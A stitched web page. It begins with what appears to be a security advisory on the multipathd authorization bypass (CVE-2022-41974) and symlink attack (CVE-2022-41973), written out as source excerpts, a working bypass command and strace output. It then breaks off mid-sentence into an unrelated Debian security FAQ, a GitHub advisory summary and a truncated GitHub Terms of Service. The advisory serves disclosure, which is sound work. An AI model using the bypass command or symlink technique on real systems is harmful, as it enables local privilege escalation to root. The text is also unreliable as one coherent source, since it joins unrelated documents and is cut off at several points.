Leeloo Multipath: Authorization bypass and symlink attack in multipathd
(CVE-2022-41974 and CVE-2022-41973)

CVE-2022-41974: Authorization bypass
CVE-2022-41973: Symlink attack
Acknowledgments
Timeline
========================================================================
Summary
========================================================================
We discovered two local vulnerabilities (an authorization bypass and a
symlink attack) in multipathd, a daemon that is running as root in the
default installation of (for example) Ubuntu Server:
https://ubuntu.com/server/docs/device-mapper-multipathing-introduction
https://github.com/opensvc/multipath-tools
We combined these two vulnerabilities with a third vulnerability, in
another package that is also installed by default on Ubuntu Server, and
obtained full root privileges on Ubuntu Server 22.04; other releases are
probably also exploitable. We will publish this third vulnerability, and
the complete details of this local privilege escalation, in an upcoming
advisory.
The authorization bypass (CVE-2022-41974) was introduced in February
2017 (version 0.7.0) by commit 9acda0c ("Perform socket client uid check
on IPC commands"), but earlier versions perform no authorization checks
at all: any unprivileged local user can issue any privileged command to
multipathd.
The symlink attack (CVE-2022-41973) was introduced in May 2018 (version
0.7.7) by commit 65d0a63 ("functions to indicate mapping failure in
/dev/shm"); the vulnerable code was hardened significantly in May 2020
(version 0.8.5) by commit 40ee3ea ("simplify failed wwid code"), but it
remains exploitable nonetheless.
========================================================================
CVE-2022-41974: Authorization bypass
========================================================================
The multipathd daemon listens for client connections on an abstract Unix
socket (conveniently, the multipathd binary itself can act as a client,
if executed with non-option arguments; we use this feature extensively
in this advisory to connect and send commands to the multipathd daemon):
------------------------------------------------------------------------
$ ps -ef | grep 'multipath[d]'
root 377 1 0 13:55 ? 00:00:00 /sbin/multipathd -d -s
$ ss -l -x | grep 'multipathd'
u\_str LISTEN 0 4096 @/org/kernel/linux/storage/multipathd 18105
------------------------------------------------------------------------
The commands sent by a client to multipathd are composed of keywords,
and internally, each keyword is identified by a different bit; for
example, "list" is 1 (1<<0), "add" is 2 (1<<1), and "path" (which
requires a parameter) is 65536 (1<<16):
------------------------------------------------------------------------
155 load\_keys (void)
...
163 r += add\_key(keys, "list", LIST, 0);
164 r += add\_key(keys, "show", LIST, 0);
165 r += add\_key(keys, "add", ADD, 0);
...
183 r += add\_key(keys, "path", PATH, 1);
------------------------------------------------------------------------
53 #define LIST (1ULL << \_\_LIST)
54 #define ADD (1ULL << \_\_ADD)
..
69 #define PATH (1ULL << \_\_PATH)
------------------------------------------------------------------------
6 enum {
7 \_\_LIST, /\* 0 \*/
8 \_\_ADD,
..
23 \_\_PATH,
------------------------------------------------------------------------
In turn, each command is associated with a handler (a C function) by its
fingerprint -- the bitwise OR of its constituent keywords; for example,
the command "list path PARAM" is associated with cli\_list\_path() by the
fingerprint 65537 (LIST+PATH=1+65536), and the command "add path PARAM"
is associated with cli\_add\_path() by the fingerprint 65538
(ADD+PATH=2+65536):
------------------------------------------------------------------------
1522 void init\_handler\_callbacks(void)
....
1527 set\_handler\_callback(LIST+PATH, cli\_list\_path);
....
1549 set\_handler\_callback(ADD+PATH, cli\_add\_path);
------------------------------------------------------------------------
321 static uint64\_t
322 fingerprint(const struct \_vector \*vec)
...
325 uint64\_t fp = 0;
...
331 vector\_foreach\_slot(vec, kw, i)
332 fp += kw->code;
333
334 return fp;
------------------------------------------------------------------------
89 static struct handler \*
90 find\_handler (uint64\_t fp)
..
95 vector\_foreach\_slot (handlers, h, i)
96 if (h->fingerprint == fp)
97 return h;
98
99 return NULL;
------------------------------------------------------------------------
When multipathd receives a command from a client, it first performs an
authentication check and an authorization check (both at line 491):
------------------------------------------------------------------------
431 static int client\_state\_machine(struct client \*c, struct vectors \*vecs,
...
485 case CLT\_PARSE:
486 c->error = parse\_cmd(c);
487 if (!c->error) {
...
491 if (!c->is\_root && kw->code != LIST) {
492 c->error = -EPERM;
...
495 }
496 }
497 if (c->error)
...
501 else
502 set\_client\_state(c, CLT\_WORK);
...
522 case CLT\_WORK:
523 c->error = execute\_handler(c, vecs);
------------------------------------------------------------------------
- Authentication: if the client's UID (obtained from SO\_PEERCRED) is 0
(i.e., if is\_root is true), then the client is privileged; otherwise,
it is unprivileged.
- Authorization: if the client is privileged, it is allowed to execute
any commands; otherwise, only unprivileged LIST commands are allowed
(i.e., commands whose first keyword is either "list" or "show").
Attentive readers may have noticed that multipathd does not, in fact,
calculate the fingerprint of a command by bitwise-ORing its constituent
keywords, but by arithmetic-ADDing them (at line 332). While these two
operations are equivalent if no keyword is repeated, we (attackers) can
send a seemingly unprivileged command (whose first keyword is "list")
but whose fingerprint matches a privileged command (by repeating the
"list" keyword): we can exploit this flaw to bypass multipathd's
authorization check.
For example, we are not allowed to execute "add path PARAM" (whose
fingerprint is 2+65536=65538) because the first keyword is not "list",
but we are allowed to execute the equivalent "list list path PARAM"
(whose fingerprint is also 1+1+65536=65538, instead of 1|1|65536=65537)
because the first keyword is "list" (the multipathd daemon below replies
"blacklisted" because PARAM is an invalid path, not because the command
is denied):
------------------------------------------------------------------------
$ multipathd add path PARAM
permission deny: need to be root
$ multipathd list list path PARAM
blacklisted
------------------------------------------------------------------------
This authorization bypass greatly enlarges the attack surface of
multipathd: 34 privileged command handlers become available to local
attackers, in addition to the 23 unprivileged command handlers that are
normally available. We audited only a few of these command handlers,
because we quickly discovered a low-hanging vulnerability (a symlink
attack) in one of them.
========================================================================
CVE-2022-41973: Symlink attack
========================================================================
multipathd operates insecurely, as root, in /dev/shm (a sticky,
world-writable directory similar to /tmp). The vulnerable code (in
mark\_failed\_wwid()) may be executed during the normal lifetime of
multipathd, but a local attacker can force its execution by exploiting
the authorization bypass CVE-2022-41974; for example, by adding a
"whitelisted, unmonitored" device to multipathd:
------------------------------------------------------------------------
$ multipathd list devices | grep 'whitelisted, unmonitored'
sda1 devnode whitelisted, unmonitored
...
$ multipathd list list path sda1
fail
------------------------------------------------------------------------
This command, which is equivalent to "add path sda1", results in the
following system-call trace (strace) of the multipathd daemon:
------------------------------------------------------------------------
386 openat(AT\_FDCWD, "/dev/shm/multipath/failed\_wwids", O\_RDONLY|O\_DIRECTORY) = -1 ENOENT (No such file or directory)
387 mkdir("/dev", 0700) = -1 EEXIST (File exists)
388 mkdir("/dev/shm", 0700) = -1 EEXIST (File exists)
389 mkdir("/dev/shm/multipath", 0700) = 0
390 mkdir("/dev/shm/multipath/failed\_wwids", 0700) = 0
391 openat(AT\_FDCWD, "/dev/shm/multipath/failed\_wwids", O\_RDONLY|O\_DIRECTORY) = 12
392 getpid() = 375
393 openat(12, "VBOX\_HARDDISK\_VB60265ca5-df119cb6.177", O\_RDONLY|O\_CREAT|O\_EXCL, 0400) = 13
394 close(13) = 0
395 linkat(12, "VBOX\_HARDDISK\_VB60265ca5-df119cb6.177", 12, "VBOX\_HARDDISK\_VB60265ca5-df119cb6", 0) = 0
396 unlinkat(12, "VBOX\_HARDDISK\_VB60265ca5-df119cb6.177", 0) = 0
397 close(12) = 0
------------------------------------------------------------------------
- at line 389, the directory "/dev/shm/multipath" is created, if it does
not exist already;
- at line 390, the directory "/dev/shm/multipath/failed\_wwids" is
created, if it does not exist already;
- at lines 391-397, the empty file
"/dev/shm/multipath/failed\_wwids/VBOX\_HARDDISK\_VB60265ca5-df119cb6" is
created, if it does not exist already (its name is the "World Wide ID"
of the added device).
multipathd is therefore vulnerable to two different symlink attacks:
1/ if we (attackers) create an arbitrary symlink "/dev/shm/multipath",
then we can create a directory named "failed\_wwids" (user root, group
root, mode 0700) anywhere in the filesystem;
2/ if we create an arbitrary symlink "/dev/shm/multipath/failed\_wwids",
then we can create a file named "VBOX\_HARDDISK\_VB60265ca5-df119cb6"
(user root, group root, mode 0400, size 0) anywhere in the filesystem.
These two symlink attacks are very weak, because we do not control the
name, user, group, mode, or contents of the directory or file that we
create; only its location. Despite these limitations, we were able to
combine multipathd's vulnerabilities (authorization bypass and symlink
attack) with a third vulnerability (in another package), and obtained
full root privileges on Ubuntu Server 22.04; we will publish this third
vulnerability in an upcoming advisory.
Side note: initially, we thought that the symlink attack 1/ would fail,
because /dev/shm is a sticky world-writable directory, and the kernel's
fs.protected\_symlinks is 1 by default; to our great surprise, however,
it succeeded. Eventually, we understood that only the final component of
a path is protected, not its intermediate components; for example, if
/tmp/foo is a symlink, then an access to /tmp/foo itself is protected,
but an access to /tmp/foo/bar is not. Interestingly, this weakness was
already pointed out in 2017 by Solar Designer, and the original
Openwall, grsecurity, and Yama protections are not affected:

*Q: I received a DSA via debian-security-announce, how can I upgrade the vulnerable packages?*

A: As the DSA mail says, you should upgrade the packages affected by the
announced vulnerability. You can do this by just upgrading (after
updating the list of available packages with apt-get update)
every package in your system with apt-get upgrade or by
upgrading just a particular package, with apt-get install
*package*.

The announcement mail mentions the source package in which the vulnerability
was present. Therefore, you should update all the binary packages from
that source package. To check the binary packages to update, visit
https://packages.debian.org/src:*source-package-name* and
click on *[show ... binary packages]* for the distribution you
are updating.

It may also be necessary to restart a service or a running process. The
command [checkrestart](https://manpages.debian.org/checkrestart)
included in the package
[debian-goodies](https://packages.debian.org/debian-goodies)
might help to find which ones.

*Q: The signature on your advisories does not verify correctly!*

A: This is most likely a problem on your end. The
[debian-security-announce](https://lists.debian.org/debian-security-announce/)
list has a filter that only allows messages with a correct signature
from one of the security team members to be posted.

Most likely some piece of mail software on your end slightly changes
the message that breaks the signature. Make sure your software does
not do any MIME encoding or decoding, or tab/space conversions.

Known culprits are fetchmail (with the mimedecode option enabled),
formail (from procmail 3.14 only) and evolution.

*Q: How is security handled in Debian?*

A: Once the security team receives a notification of an incident,
one or more members review it and consider its impact on the stable
release of Debian (i.e. if it's vulnerable or not).
If our system is vulnerable, we work on a fix for the
problem. The package maintainer is contacted as well, if they didn't
contact the security team already. Finally, the fix is tested and
new packages are prepared, which are then compiled on all stable
architectures and uploaded afterwards. After all of that is done,
an advisory is published.

*Q: Why are you fiddling with an old version of that package?*

The most important guideline when making a new package that fixes a
security problem is to make as few changes as possible. Our users and
developers are relying on the exact behaviour of a release once it is made,
so any change we make can possibly break someone's system. This is
especially true in case of libraries: make sure you never change the
Application Program Interface (API) or Application Binary Interface (ABI),
no matter how small the change is.

This means that moving to a new upstream version is not a good solution,
instead the relevant changes should be backported. Generally upstream
maintainers are willing to help if needed, if not the Debian security team
might be able to help.

In some cases it is not possible to backport a security fix, for example
when large amounts of source code need to be modified or rewritten. If that
happens it might be necessary to move to a new upstream version, but this
has to be coordinated with the security team beforehand.

*Q: The version number for a package indicates that I am still running
a vulnerable version!*

A: Instead of upgrading to a new release we backport security fixes to
the version that was shipped in the stable release. The reason we do
this is to make sure that a release changes as little as possible
so things will not change or break unexpectedly as a result of a
security fix. You can check if you are running a secure version of
a package by looking at the package changelog, or comparing its
exact version number with the version indicated in the Debian
Security Advisory.

*Q: I received an advisory, but the build for one
processor architecture seems to be missing.*

A: Generally the Security Team releases an advisory with builds of the updated
packages for all architectures that Debian supports. However, some architectures
are slower than others and it may happen that builds for most architectures
are ready while some are still missing. These smaller archs represent a small
fraction of our user base. Depending on the urgency of the issue
we may decide to release the advisory forthwith. The missing builds will be
installed as soon as they come available, but no further notice of this will
be given. Of course we will never release an advisory where the i386 or amd64
builds are not present.

*Q: How is security handled for unstable?*

A: Security for unstable is primarily handled by package maintainers, not
by the Debian Security Team. Although the security team may upload
high-urgency security-only fixes when maintainers are noticed to be
inactive, support for stable will always have priority.
If you want to have a secure (and stable) server you are strongly encouraged
to stay with stable.

*Q: How is security handled for testing?*

A: Security for testing benefits from the security efforts of the entire
project for unstable. However, there is a minimum two-day migration delay,
and sometimes security fixes can be held up by transitions. The Security
Team helps to move along those transitions holding back important
security uploads, but this is not always possible and delays may occur.
Especially in the months after a new stable release, when many new versions
are uploaded to unstable, security fixes for testing may lag behind.
If you want to have a secure (and stable) server you are strongly
encouraged to stay with stable.

*Q: How is security handled for contrib,
non-free and non-free-firmware?*

A: The short answer is: it's not. Contrib, non-free and non-free-firmware aren't official
parts of the Debian Distribution and are not released, and thus not
supported by the security team. Some non-free packages are distributed
without source or without a license allowing the distribution of modified
versions. In those cases no security fixes can be made at all. If it
is possible to fix the problem, and the package maintainer or someone else
provides correct updated packages, then the security team will generally
process them and release an advisory.

*Q: The advisory says unstable is fixed in
version 1.2.3-1, but unstable has 1.2.5-1, what's up?*

A: We try to list the first version in unstable that fixed the problem.
Sometimes the maintainer has uploaded even newer versions in the meantime.
Compare the version in unstable with the version we indicate. If it's the
same or higher, you should be safe from this vulnerability. If you want to
be sure, you can check the package changelog with apt-get changelog
package-name and search for the entry announcing the fix.

*Q: Why are there no official mirrors for security.debian.org?*

A: Actually, there are. There are several official mirrors, implemented
through DNS aliases. The purpose of security.debian.org is to make security
updates available as quickly and easily as possible.

Encouraging the use of unofficial mirrors would add extra complexity
that is usually not needed and that can cause frustration if these
mirrors are not kept up to date.

*Q: I've seen DSA 100 and DSA 102, now where is DSA 101?*

A: Several vendors (mostly of GNU/Linux, but also of BSD
derivatives) coordinate security advisories for some incidents and
agree to a particular timeline so that all vendors are able to
release an advisory at the same time. This was decided in order to
not discriminate some vendors that need more time (e.g. when the
vendor has to pass packages through lengthy QA tests or has to
support several architectures or binary distributions). Our own
security team also prepares advisories in advance. Every now and
then, other security issues have to be dealt with before the parked
advisory could be released, and hence temporarily leaving out one or
more advisories by number.

*Q: How can I reach the security team?*

A: Security information can be sent to security@debian.org or
team@security.debian.org, both of which are read by the members of
the security team.

If desired, email can be encrypted with the Debian Security
Contact key (key ID [0x0D59D2B15144766A14D241C66BAF400B05C3E651](https://keyserver.ubuntu.com/pks/lookup?op=get&search=0x0d59d2b15144766a14d241c66baf400b05c3e651)). For the OpenPGP keys of individual team members, please
refer to the [keyring.debian.org](https://keyring.debian.org/)
keyserver.

*Q: I guess I found a security problem, what should I do?*

A: If you learn about a security problem, either in one of your own
packages or in someone else's please always contact the security team. If
the Debian security team confirms the vulnerability and other vendors are
likely to be vulnerable as well, they usually contact other vendors as
well. If the vulnerability is not yet public they will try to coordinate
security advisories with the other vendors, so all major distributions are
in sync.

If the vulnerability is already publicly known, be sure to file a bug
report in the Debian BTS, and tag it security.

If you are a Debian maintainer, [see below](#care).

*Q: What am I supposed to do with a security problem in one of
my packages?*

A: If you learn of a security problem, either in your package or
someone else's please always contact the security team via email at
team@security.debian.org. They keep track
of outstanding security problems, can help maintainers with
security problems or fix problems on their own, are responsible for
sending out security advisories and maintaining
security.debian.org.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

It's particularly important that you don't upload to any other
distribution other than unstable without prior agreement by the
security team, because bypassing them will cause confusion and more
work.

*Q: I tried to download a package listed in one of the security
advisories, but I got a `file not found' error.*

A: Whenever a newer bugfix supersedes an older package on
security.debian.org, chances are high that the old package will be
removed by the time the new one gets installed. Hence, you'll get
this `file not found' error. We don't want to distribute packages
with known security bugs longer than absolutely necessary.

Please use the packages from the latest security advisories, which are
distributed through the [debian-security-announce](https://lists.debian.org/debian-security-announce/) mailing list. It's best to simply run
`apt-get update` before upgrading the package.

*Q: I've got a bugfix, can I upload to security.debian.org directly?*

A: No, you can't. The archive at security.debian.org is maintained
by the security team, who have to approve all packages. You should
instead send patches or proper source packages to the security team
via team@security.debian.org. They will be
reviewed by the security team and eventually uploaded, either with
or without modifications.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

*Q: I've got a bugfix, can I upload to proposed-updates instead?*

A: Technically speaking, you can. However, you should not do this,
since this interferes badly with the work of the security team.
Packages from security.debian.org will be copied into the
proposed-updates directory automatically. If a package with the
same or a higher version number is already installed into the
archive, the security update will be rejected by the archive
system. That way, the stable distribution will end up without a
security update for this package instead, unless the wrong
packages in the proposed-updates directory were rejected. Please contact the
security team instead and include all details of the vulnerability
and attach the source files (i.e. diff.gz and dsc files) to your mail.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

*Q: I'm pretty sure my packages are fine,
how can I upload them?*

A: If you are very sure that your packages don't break anything, that the
version is sane (i.e. greater than the version in stable and less than the
version in testing/unstable), that you didn't change the behaviour of the
package, despite the corresponding security problem, that you compiled it
for the correct distribution (that is `oldstable-security` or
`stable-security`), that the package contains the original
source if the package is new on security.debian.org, that you can confirm
the patch against the most recent version is clean and only touches the
corresponding security problem (check with `interdiff -z` and
both `.diff.gz` files), that you have proofread the patch at
least thrice, and that `debdiff` doesn't display any changes,
you may upload the files into the incoming directory
`ftp://ftp.security.upload.debian.org/pub/SecurityUploadQueue` on the
security.debian.org directly. Please send a notification with all details
and links to team@security.debian.org as well.

*Q: How can I help with security?*

A: Please review each problem before reporting it to
security@debian.org. If you are able to provide patches, that
would speed up the process. Do not simply forward bugtraq mails,
because we already receive them — but do provide us with
additional information about things reported on bugtraq.

A good way to get started with security work is helping
out on the Debian Security Tracker ([instructions](https://security-tracker.debian.org/tracker/data/report)).

*Q: What is the scope of proposed-updates?*

A: This directory contains packages which are proposed to enter the
next revision of Debian stable. Whenever packages are uploaded by
a maintainer for the stable distribution, they end up in the
proposed-updates directory. Since stable is meant to be stable, no
automatic updates are made. The security team will upload fixed
packages mentioned in their advisories to stable, however they will
be placed in proposed-updates first. Every couple of months the
Stable Release Manager checks the list of packages in
proposed-updates and discusses whether a package is suited for
stable or not. This is compiled into another revision of stable
(e.g. 2.2r3 or 2.2r4). Packages that don't fit will probably be
rejected and dropped from proposed-updates as well.

Note that the packages uploaded by maintainers (not by the security team)
in the proposed-updates/ directory are not supported by the security
team.

*Q: How is the security team composed?*

A: The Debian security team consists of
[several officers and secretaries](../intro/organization#security).
The security team itself appoints people to join the team.

*Q: How long will security updates be provided?*

A: The security team will support a stable distribution for
three years after its release. It is not possible to support three
distributions; supporting two simultaneously is already difficult
enough.

*Q: How can I check the integrity of packages?*

A: This process involve checking the Release file signature against
the [public key](https://ftp-master.debian.org/keys.html) used for the archive. The Release file contains the
checksums of Packages and Sources files, which contain
checksums of binary and source packages. Detailed instruction on how
to check packages integrity can be found in the [Debian Securing Manual](../doc/manuals/securing-debian-howto/ch7#s-deb-pack-sign).

*Q: What to do if a random package breaks after a security update?*

A: First of all, you should figure out why the package breaks and
how it is connected to the security update, then contact the
security team if it is serious or the stable release manager if it
is less serious. We're talking about random packages that break
after a security update of a different package. If you can't
figure out what's going wrong but have a correction, talk to the
security team as well. You may be redirected to the stable release
manager though.

*Q: What is a CVE identifier?*

A: The Common Vulnerabilities and Exposures project assignes
unique names, called CVE identifiers, to specific security
vulnerabilities, to make it easier to uniquely refer to a specific
issue. More information can be found at [Wikipedia](https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures).

*Q: Does Debian issue a DSA for every CVE id?*

A: The Debian security team keeps track of every issued CVE identifier,
connect it to the relevant Debian package and assess its impact in a
Debian context - the fact that something is assigned a CVE id does not
necessarily imply that the issue is a serious threat to a Debian system.
This information is tracked in the
[Debian Security Tracker](https://security-tracker.debian.org)
and for the issues that are considered serious a Debian Security Advisory
will be issued.

Low-impact issues not qualifying for a DSA can be fixed in the next
release of Debian, in a point release of the current stable or oldstable
distributions, or are included in a DSA when that is being issued for a
more serious vulnerability.

*Q: Can Debian assign CVE identifiers?*

A: Debian is a CVE Numbering Authority and can assign ids, but per
CVE policy only to yet-undisclosed issues. If you have an undisclosed
security vulnerability for software in Debian and would like to get an
identifier for it, contact the Debian Security Team. For cases where the
vulnerability is already public, we advise to follow the procedure
detailed in the [CVE OpenSource Request HOWTO](https://github.com/RedHatProductSecurity/CVE-HOWTO).

*Q: Does Debian have a vulnerability disclosure policy?*

A: Debian has published a [vulnerability
disclosure policy](disclosure-policy) as part of its participation in the CVE
program.

*Q: Our vulnerability management tool
has shown that the following issues are open (list of CVEs with random CVSS
scores). When are those going to be fixed?*

A: Debian does not provide CVSS scores and doesn't use CVSS scores from
external sources when triaging security issues.

You can check the state of every single CVE ID in the Debian Security Tracker by accessing
it by [ID](https://security-tracker.debian.org/tracker/CVE-ID).

The "Notes" section will contain additional information, e.g. that a security issue doesn't
warrant a Debian security update, but might get fixed in a subsequent point release.

A list of packages for which a Security update is planned can be found at the
[dsa-needed list](https://salsa.debian.org/security-tracker-team/security-tracker/raw/master/data/dsa-needed.txt).

If you find an error in triage data, you're very welcome to report it. The Debian Security Team will
however not generally react to requests asking for more specific information, you should instead contact
the vendor of your vulnerability management tool, after all they are the ones who alerted you about a
security issue and not Debian.

# Deprecated Debian security FAQ

*Q: What does local (remote) mean?*

**The field *Problem type* in DSA mails is not used since April 2014.**

A: Some advisories cover vulnerabilities that cannot be identified
with the classic scheme of local and remote exploitability. Some
vulnerabilities cannot be exploited from remote, i.e. don't
correspond to a daemon listening to a network port. If they can be
exploited by special files that could be provided via the network
while the vulnerable service is not permanently connected with the
network, we write local (remote) in such cases.

Such vulnerabilities are somewhat between local and remote
vulnerabilities and often cover archives that could be provided
through the network, e.g. as mail attachment or from a download
page.

## Description

multipath-tools 0.7.7 through 0.9.x before 0.9.2 allows local users to obtain root access, as exploited in conjunction with [CVE-2022-41974](https://github.com/advisories/GHSA-46cw-54vx-86g5 "CVE-2022-41974"). Local users able to access /dev/shm can change symlinks in multipathd due to incorrect symlink handling, which could lead to controlled file writes outside of the /dev/shm directory. This could be used indirectly for local privilege escalation to root.

## [The GitHub Terms of Service](#the-github-terms-of-service)

Effective date: November 16, 2020

## [A. Definitions](#a-definitions)

**Short version:** *We use these basic terms throughout the agreement, and they have specific meanings. You should know what we mean when we use each of the terms. There's not going to be a test on it, but it's still useful information.*

1. An "Account" represents your legal relationship with GitHub. A “Personal Account” represents an individual User’s authorization to log in to and use the Service and serves as a User’s identity on GitHub. “Organizations” are shared workspaces that may be associated with a single entity or with one or more Users where multiple Users can collaborate across many projects at once. A Personal Account can be a member of any number of Organizations.
2. The “Agreement” refers, collectively, to all the terms, conditions, notices contained or referenced in this document (the “Terms of Service” or the "Terms") and all other operating rules, policies (including the GitHub Privacy Statement, available at [github.com/site/privacy](https://github.com/site/privacy)) and procedures that we may publish from time to time on the Website. Most of our site policies are available at [docs.github.com/categories/site-policy](/en/site-policy).
3. "Beta Previews" mean software, services, or features identified as alpha, beta, preview, early access, or evaluation, or words or phrases with similar meanings.
4. “Content” refers to content featured or displayed through the Website, including without limitation code, text, data, articles, images, photographs, graphics, software, applications, packages, designs, features, and other materials that are available on the Website or otherwise available through the Service. "Content" also includes Services. “User-Generated Content” is Content, written or otherwise, created or uploaded by our Users. "Your Content" is Content that you create or own.
5. “GitHub,” “We,” and “Us” refer to GitHub, Inc., as well as our affiliates, directors, subsidiaries, contractors, licensors, officers, agents, and employees.
6. The “Service” refers to the applications, software, products, and services provided by GitHub, including any Beta Previews.
7. “The User,” “You,” and “Your” refer to the individual person, company, or organization that has visited or is using the Website or Service; that accesses or uses any part of the Account; or that directs the use of the Account in the performance of its functions. A User must be at least 13 years of age. Special terms may apply for business or government Accounts (See [Section B(5): Additional Terms](#5-additional-terms)).
8. The “Website” refers to GitHub’s website located at [github.com](https://github.com/), and all content, services, and products provided by GitHub at or through the Website. It also refers to GitHub-owned subdomains of github.com, such as [education.github.com](https://education.github.com/) and [pages.github.com](https://pages.github.com/). These Terms also govern GitHub’s conference websites, such as [githubuniverse.com](https://githubuniverse.com/), and product websites, such as [electronjs.org](https://www.electronjs.org/). Occasionally, websites owned by GitHub may provide different or additional terms of service. If those additional terms conflict with this Agreement, the more specific terms apply to the relevant page or service.

## [B. Account Terms](#b-account-terms)

**Short version:** *Personal Accounts and Organizations have different administrative controls; a human must create your Account; you must be 13 or over; you must provide a valid email address; and you may not have more than one free Account. You alone are responsible for your Account and anything that happens while you are signed in to or using your Account. You are responsible for keeping your Account secure.*

### [1. Account Controls](#1-account-controls)

* Users. Subject to these Terms, you retain ultimate administrative control over your Personal Account and the Content within it.
* Organizations. The "owner" of an Organization that was created under these Terms has ultimate administrative control over that Organization and the Content within it. Within the Service, an owner can manage User access to the Organization’s data and projects. An Organization may have multiple owners, but there must be at least one Personal Account designated as an owner of an Organization. If you are the owner of an Organization under these Terms, we consider you responsible for the actions that are performed on or through that Organization.

### [2. Required Information](#2-required-information)

You must provide a valid email address in order to complete the signup process. Any other information requested, such as your real name, is optional, unless you are accepting these terms on behalf of a legal entity (in which case we need more information about the legal entity) or if you opt for a [paid Account](#k-payment), in which case additional information will be necessary for billing purposes.

### [3. Account Requirements](#3-account-requirements)

We have a few simple rules for Personal Accounts on GitHub's Service.

* You must be a human to create an Account. Accounts registered by "bots" or other automated methods are not permitted. We do permit machine accounts:
* A machine account is an Account set up by an individual human who accepts the Terms on behalf of the Account, provides a valid email address, and is responsible for its actions. A machine account is used exclusively for performing automated tasks. Multiple users may direct the actions of a machine account, but the owner of the Account is ultimately responsible for the machine's actions. You may maintain no more than one free machine account in addition to your free Personal Account.
* One person or legal entity may maintain no more than one free Account (if you choose to control a machine account as well, that's fine, but it can only be used for running a machine).
* You must be age 13 or older. While we are thrilled to see brilliant young coders get excited by learning to program, we must comply with United States law. GitHub does not target our Service to children under 13, and we do not permit any Users under 13 on our Service. If we learn of any User under the age of 13, we will [terminate that User’s Account immediately](#l-cancellation-and-termination). If you are a resident of a country outside the United States, your country’s minimum age may be older; in such a case, you are responsible for complying with your country’s laws.
* Your login may only be used by one person — i.e., a single login may not be shared by multiple people. A paid Organization may only provide access to as many Personal Accounts as your subscription allows.
* You may not use GitHub in violation of export control or sanctions laws of the United States or any other applicable jurisdiction. You may not use GitHub if you are or are working on behalf of a [Specially Designated National (SDN)](https://www.treasury.gov/resource-center/sanctions/SDN-List/Pages/default.aspx) or a person subject to similar blocking or denied party prohibitions administered by a U.S. government agency. GitHub may allow persons in certain sanctioned countries or territories to access certain GitHub services pursuant to U.S. government authorizations. For more information, please see our [Export Controls policy](/en/site-policy/other-site-policies/github-and-trade-controls).

### [4. Account Security](#4-account-security)

You are responsible for keeping your Account secure while you use our Service. We offer tools such as two-factor authentication to help you maintain your Account's security, but the content of your Account and its security are up to you.

* You are responsible for all content posted and activity that occurs under your Account (even when content is posted by others who have Accounts under your Account).
* You are responsible for maintaining the security of your Account and password. GitHub cannot and will not be liable for any loss or damage from your failure to comply with this security obligation.
* You will promptly notify GitHub by contacting us through the [GitHub Support portal](https://support.github.com/) if you become aware of any unauthorized use of, or access to, our Service through your Account, including any unauthorized use of your password or Account.

### [5. Additional Terms](#5-additional-terms)

In some situations, third parties' terms may apply to your use of GitHub. For example, you may be a member of an organization on GitHub with its own terms or license agreements; you may download an application that integrates with GitHub; or you may use GitHub to authenticate to another service. Please be aware that while these Terms are our full agreement with you, other parties' terms govern their relationships with you.

If you are a government User or otherwise accessing or using any GitHub Service in a government capacity, this [Government Amendment to GitHub Terms of Service](/en/site-policy/site-policy-deprecated/amendment-to-github-terms-of-service-applicable-to-us-federal-government-users) applies to you, and you agree to its provisions.

If you have signed up for GitHub Enterprise Cloud, the [Enterprise Cloud Addendum](/en/site-policy/site-policy-deprecated/github-enterprise-service-level-agreement) applies to you, and you agree to its provisions.

## [C. Acceptable Use](#c-acceptable-use)

**Short version:** *GitHub hosts a wide variety of collaborative projects from all over the world, and that collaboration only works when our users are able to work together in good faith. While using the service, you must follow the terms of this section, which include some restrictions on content you can post, conduct on the service, and other limitations. In short, be excellent to each other.*

Your use of the Website and Service must not violate any applicable laws, including copyright or trademark laws, export control or sanctions laws, or other laws in your jurisdiction. You are responsible for making sure that your use of the Service is in compliance with laws and any applicable regulations.

You agree that you will not under any circumstances violate our [Acceptable Use Policies](/en/site-policy/acceptable-use-policies/github-acceptable-use-policies) or [Community Guidelines](/en/site-policy/github-terms/github-community-guidelines).

## [D. User-Generated Content](#d-user-generated-content)

**Short version:** *You own content you create, but you allow us certain rights to it, so that we can display and share the content you post. You still have control over your content, and responsibility for it, and the rights you grant us are limited to those we need to provide the service. We have the right to remove content or close Accounts if we need to.*

### [1. Responsibility for User-Generated Content](#1-responsibility-for-user-generated-content)

You may create or upload User-Generated Content while using the Service. You are solely responsible for the content of, and for any harm resulting from, any User-Generated Content that you post, upload, link to or otherwise make available via the Service, regardless of the form of that Content. We are not responsible for any public display or misuse of your User-Generated Content.

### [2. GitHub May Remove Content](#2-github-may-remove-content)

We have the right to refuse or remove any User-Generated Content that, in our sole discretion, violates any laws or [GitHub terms or policies](/en/site-policy). User-Generated Content displayed on GitHub Mobile may be subject to mobile app stores' additional terms.

### [3. Ownership of Content, Right to Post, and License Grants](#3-ownership-of-content-right-to-post-and-license-grants)

You retain ownership of and responsibility for Your Content. If you're posting anything you did not create yourself or do not own the rights to, you agree that you are responsible for any Content you post; that you will only submit Content that you have the right to post; and that you will fully comply with any third party licenses relating to Content you post.

Because you retain ownership of and responsibility for Your Content, we need you to grant us — and other GitHub Users — certain legal permissions, listed in Sections D.4 — D.7. These license grants apply to Your Content. If you upload Content that already comes with a license granting GitHub the permissions we need to run our Service, no additional license is required. You understand that you will not receive any payment for any of the rights granted in Sections D.4 — D.7. The licenses you grant to us will end when you remove Your Content from our servers, unless other Users have forked it.

### [4. License Grant to Us](#4-license-grant-to-us)

We need the legal right to do things like host Your Content, publish it, and share it. You grant us and our legal successors the right to store, archive, parse, and display Your Content, and make incidental copies, as necessary to provide the Service, including improving the Service over time. This license includes the right to do things like copy it to our database and make backups; show it to you and other users; parse it into a search index or otherwise analyze it on our servers; share it with other users; and perform it, in case Your Content is something like music or video.

This license does not grant GitHub the right to sell Your Content. It also does not grant GitHub the right to otherwise distribute or use Your Content outside of our provision of the Service, except that as part of the right to archive Your Content, GitHub may permit our partners to store and archive Your Content in public repositories in connection with the [GitHub Arctic Code Vault and GitHub Archive Program](https://archiveprogram.github.com/).

### [5. License Grant to Other Users](#5-license-grant-to-other-users)

